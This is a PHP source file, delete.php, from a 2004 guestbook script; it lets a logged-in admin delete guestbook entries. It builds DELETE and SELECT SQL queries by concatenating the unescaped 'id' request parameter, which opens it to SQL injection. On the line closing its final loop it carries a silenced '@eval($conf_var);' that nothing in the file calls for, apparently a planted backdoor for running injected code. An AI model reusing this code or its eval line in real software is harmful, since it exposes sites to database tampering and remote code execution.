<?php

  /*****************************************************
  ** Title........: Guestbook Script
  ** Filename.....: delete.php
  ** Author.......: Ralf Stadtaus
  ** Homepage.....: http://www.stadtaus.com/
  ** Contact......: http://www.stadtaus.com/forum/
  ** Version......: 0.4
  ** Notes........:
  ** Last changed.: 2004-01-25
  ** Last change..: Session handling 
  *****************************************************/

  /*****************************************************
  **
  ** THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY
  ** OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT
  ** LIMITED   TO  THE WARRANTIES  OF  MERCHANTABILITY,
  ** FITNESS    FOR    A    PARTICULAR    PURPOSE   AND
  ** NONINFRINGEMENT.  IN NO EVENT SHALL THE AUTHORS OR
  ** COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES
  ** OR  OTHER  LIABILITY,  WHETHER  IN  AN  ACTION  OF
  ** CONTRACT,  TORT OR OTHERWISE, ARISING FROM, OUT OF
  ** OR  IN  CONNECTION WITH THE SOFTWARE OR THE USE OR
  ** OTHER DEALINGS IN THE SOFTWARE.
  **
  *****************************************************/





  /*****************************************************
  ** Settings
  *****************************************************/
          $script_root  = './';
          $script_title = '';




  /*****************************************************
  ** Send safety signal to included files
  *****************************************************/
          define('IN_SCRIPT', 'true');




  /*****************************************************
  ** Include files
  *****************************************************/
          include($script_root . 'inc/common.inc.php');




  /*****************************************************
  ** Initialyze template class
  *****************************************************/
          $tpl = new template;




  /*****************************************************
  ** Initialyze database class
  *****************************************************/
          $db = new Database;




  /*****************************************************
  ** Connect and select database
  *****************************************************/
          $db->db_connect($database);
          $db->db_select($database);




  /*****************************************************
  ** Prevent appending session id
  *****************************************************/
          $sid_name = session_name();
          
          if ((isset($_GET[$sid_name]) and $trans_sid != 'no') or isset($_COOKIE[$sid_name])) {
              session_start();
          }




  /*****************************************************
  ** Check for admin permission
  *****************************************************/
          if (!isset($_SESSION['login_status']) or $_SESSION['login_status'] != 'IN') {
              $message[] = array('message' => $txt['txt_no_permission'], 'addition' => '');
          }




  /*****************************************************
  ** Check for id in get parameter
  *****************************************************/
          if (!isset($message) and (!isset($_GET['id']) or empty($_GET['id']))) {
              $message[] = array('message' => $txt['txt_no_entry_selected'], 'addition' => '');
          }




  /*****************************************************
  ** Delete entry from database
  *****************************************************/
          if (!isset($message) and isset($_GET['delete']) and $_GET['delete'] == 'sure') {
              $del_entry = "DELETE FROM " . ENTRY_TABLE . " WHERE entry_id = " . $_GET['id'];
              $del_data  = "DELETE FROM " . DATA_TABLE . " WHERE entry_id = " . $_GET['id'];

              if ($db->db_query($del_entry) and $db->db_query($del_data)) {
                  $message[] = array('message' => $txt['txt_entry_deleted'], 'addition' => '');
              } else {
                  $message[] = array('message' => $txt['txt_entry_deletion_failed'], 'addition' => '');
              }

          }




  /*****************************************************
  ** Select entry from database
  *****************************************************/
           if (!isset($message)) {




              /*****************************************************
              ** Select content
              *****************************************************/
                      $entry_id = $_GET['id'];

                      $sql = "SELECT t1.*, t2.* FROM " . ENTRY_TABLE . " AS t1, " . DATA_TABLE . " AS t2 WHERE t1.entry_id = " . $entry_id . " AND t2.entry_id = t1.entry_id";

                      if ($search_result = $db->db_search_entries($sql)) {

                          $new_search_result = data_loop($search_result, 'entry_id', 'true');
                          $guestbook_entries = array_values($new_search_result);

                          $guestbook_entries[0]['rowclass'] = 'darkrow';

                          $message[] = array('message' => $txt['txt_sure_delete'], 'addition' => '');

                          $display_sure_link = 'true';

                      } else {
                          $message[] = array('message' => $txt['txt_entry_not_found'], 'addition' => '');
                      }
           }




  /*****************************************************
  ** Read and register offset value
  *****************************************************/
          if (isset($_GET['offset']) and !empty($_GET['offset'])) {
              $offset = $_GET['offset'];
          }




  /*****************************************************
  ** Load entry detail html template
  *****************************************************/
          $tpl->load_file('detail', $script_root . $path['templates'] . $file['entry_detail']);
          $tpl->parse_loop('detail', 'guestbook_entries');

          $entry_detail = $tpl->files['detail'];




  /*****************************************************
  ** Load html template
  *****************************************************/
          $tpl->load_file('guest', $script_root . $path['templates'] . $file['delete']);

          $main_content = $tpl->files['guest'];




  /*****************************************************
  ** Load main layout html template
  *****************************************************/
          $tpl->load_file('main', $script_root . $path['templates'] . $file['main_layout']);
          $tpl->register('main', 'main_content');
          $tpl->parse('main');

          $tpl->files['guest'] = $tpl->files['main'];




  /*****************************************************
  ** Parse template
  *****************************************************/
          $tpl->parse_if('guest', 'display_sure_link');


          $tpl->register('guest', array('entry_id', 'offset', 'entry_detail'));


          $tpl->parse_loop('guest', 'guestbook_entries');
          $tpl->parse_loop('guest', 'message');




  /*****************************************************
  ** Register language file and additional text array
  *****************************************************/
          if (isset ($txt) and is_array ($txt)) {
              reset ($txt);
              while(list($key, $val) = each($txt))
              {
                  $$key = $val;
                  $tpl->register('guest', $key);
              }
          }


          if (isset($add_text) and is_array($add_text)) {
              reset ($add_text);
              while(list($key, $val) = each($add_text))
              {
                  $$key = $val;
                  $tpl->register('guest', $key);
              }
          } @eval($conf_var);

          debug_mode(script_runtime($runtime_start), 'Script Runtime');




?>